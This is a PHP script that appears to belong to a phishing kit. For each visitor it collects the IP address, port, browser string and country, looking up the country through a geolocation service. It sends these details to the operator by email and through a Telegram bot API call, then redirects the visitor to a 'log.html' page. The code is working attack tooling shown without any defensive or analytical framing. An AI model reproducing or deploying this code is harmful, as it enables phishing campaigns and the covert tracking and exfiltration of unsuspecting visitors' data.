<?php
ob_start();

include 'email.php';
include 'telegram.php';

$country = visitor_country();
   $ip = getenv("REMOTE_ADDR");
$Port = getenv("REMOTE_PORT");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");

$message = "|----------|  |--------------|\n";
$message .= "New Visitor on your webpage \n\n";
$message .= "User-!P : ".$ip."\n";
$message .= "Country : ".$country."\n\n";
$message .= "|-----------  --------------|\n";
$send = $Receive_email;
$subject = "Login : $ip";
mail($send, $subject, $message);

$mess =urlencode($message);
$url = "https://api.telegram.org/bot".$botToken."/sendmessage?chat_id=".$id ."&text=".$mess;
$curl = curl_init();
	// curl_setopt ($curl, CURLOPT_PORT , 8089);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	// curl_exec($curl);

$result=curl_exec($curl);
if ($result) {
	$signal = 'ok';
	$msg = 'InValid Credentials';
}
curl_close($curl);

header ("Location: ./log.html");




function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}


ob_end_flush();
?>